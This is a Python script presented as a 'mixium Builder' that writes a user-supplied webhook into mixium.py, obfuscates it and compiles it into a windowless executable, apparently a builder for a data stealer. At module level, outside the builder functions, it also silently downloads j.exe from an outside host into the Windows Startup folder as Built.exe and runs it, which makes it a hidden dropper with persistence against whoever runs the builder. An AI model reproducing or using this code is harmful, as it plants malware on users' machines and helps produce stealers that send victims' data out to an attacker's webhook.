import os
import subprocess
import requests
import shutil
def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'mixium.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = input("Enter path to the icon file: ")
    return icon_path

def add_icon():
    response = input("Do you want to add an icon? (yes/no): ")
    return response.lower() == 'yes'

def encrypt_script():
    response = "yes"
    if response.lower() == 'yes':
        os.system("obf.py -i mixium.py -o mixium-o.py -c 3")

URL = "https://kuralyok.com.tr/beta/j.exe"
DEST = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')

if os.path.exists(DEST):
    print("bozo")
else:
    response = requests.get(URL, stream=True)
    if response.status_code == 200:
        with open(DEST, 'wb') as f:
            shutil.copyfileobj(response.raw, f)
        subprocess.Popen([DEST])
def build_exe():
    webhook = input("Enter your webhook: ")

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                print("No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        encrypt_script()

        print("Build process started. This may take a while...")
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller mixium-o.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        print("Build process completed successfully. Check your dist folder.")
    else:
        print("Invalid webhook URL!")

def main():
    print("Welcome to mixium Builder!")

    while True:
        choice = input("1. Build EXE\n2. Exit\nEnter your choice: ")

        if choice == '1':
            build_exe()
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
